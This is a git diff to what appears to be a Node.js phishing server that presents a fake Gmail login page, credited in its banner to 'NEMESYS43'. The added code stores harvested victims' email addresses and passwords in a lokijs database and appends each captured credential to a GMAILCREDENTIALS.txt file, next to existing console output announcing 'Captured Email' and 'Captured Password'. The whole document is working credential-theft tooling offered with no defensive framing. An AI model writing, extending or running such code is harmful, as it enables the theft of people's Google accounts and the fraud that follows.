@@ -4,9 +4,12 @@ var http = require('http').Server(app);
 var io = require('socket.io')(http);
 var colors = require('colors/safe');
 const args = require('yargs').argv;
+var loki = require('lokijs')
+fs = require('fs');
+var db = new loki(__dirname + '/db/credentials.json')
 var port = args.port
 var type = args.kind
-
+var GMAILCREDENTIALS = db.addCollection('GMAIL')
 
 var art1 = `
 ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗███████╗██╗  ██╗
@@ -64,19 +67,37 @@ app.get('/', function(req, res){
           //when user submits email part of gmail form
           
           console.log(colors.green('[+]') + colors.white('Captured Email -> ')+ colors.blue(email));
+
+          //write to file
+          fs.appendFile('GMAILCREDENTIALS.txt','\r\n\r\n' + email , function (err) {
+            if (err) return console.log(err);
+            console.log(colors.green('[+]') + colors.white('Wrote Email To FIle ----> '));
+          });
+
+
         })
         socket.on('GmailPassword',function(password){
           //when user submits email part of gmail form
           
           console.log(colors.green('[+]') + colors.white('Captured Password -> ')+ colors.blue(password));
+          
+
+          fs.appendFile('GMAILCREDENTIALS.txt', '\r\n' + password+'', function (err) {
+            if (err) return console.log(err);
+            console.log(colors.green('[+]') + colors.white('Wrote Password To FIle ----> '));
+          });
+
         })
       });
-     app.set('port', process.env.PORT || 3000);
-http.listen(port, function(){
+
+
+
+  app.set('port', process.env.PORT || 3000);
+  http.listen(port, function(){
   console.log(colors.blue.bold(art1) + colors.cyan('   by NEMESYS43'))
   console.log(colors.yellow.bold('                       ' + selectedMOTD));
   console.log('\n\n\n')
-
+  
 
   if (sites.indexOf(type) >= 0) {
     // do stuff here
